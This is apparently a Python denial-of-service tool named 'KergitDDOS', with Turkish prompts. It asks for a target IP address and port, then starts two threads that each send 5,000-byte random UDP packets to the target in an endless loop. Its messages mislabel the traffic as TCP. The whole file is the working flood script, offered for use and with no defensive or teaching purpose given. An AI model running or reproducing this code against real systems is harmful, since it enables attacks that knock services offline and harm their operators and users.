import socket , requests , random , colorama , threading
from colorama import init , Fore
init()



banner = """
***********************************
*                                 *
*                                 *
*   KergitDDOS/Github:kayrakrgt   *                           
*                                 *
*                                 *
*                                 *
*                                 *
***********************************


"""

print(Fore.LIGHTMAGENTA_EX+banner)
print(Fore.LIGHTCYAN_EX)
ip = input("IP Adresi giriniz>>>")
port = int(input("Port giriniz>>>"))

def udp():
   sock = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
   sock.settimeout(5)
   
   try:
         print("IP Adresi bulundu! TCP paketleri gönderiliyor!!!")
         while True:
          try:
           rand = random._urandom(5000)
           sock.sendto(rand, (ip,port))
           print("paket gönderildi!!!")  
          except Exception:
              print("Paket Gönderilemedi!")
   except Exception:
           print("ip adresi bulunamadı")
   except KeyboardInterrupt:
           print("CTRL C İLE PROGRAM DURDURULDU")
def udp2():
   sock = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
   sock.settimeout(5)
   
   try:
         print("IP Adresi bulundu! TCP paketleri gönderiliyor!!!")
         while True:
          try:
           rand = random._urandom(5000)
           sock.sendto(rand, (ip,port))
           print("paket gönderildi!!!")  
          except Exception:
              print("Paket Gönderilemedi!")
   except Exception:
           print("ip adresi bulunamadı")
   except KeyboardInterrupt:
           print("CTRL C İLE PROGRAM DURDURULDU")
thread1 = threading.Thread(target=udp)
thread1.start()
thread2 = threading.Thread(target=udp2)
thread2.start()






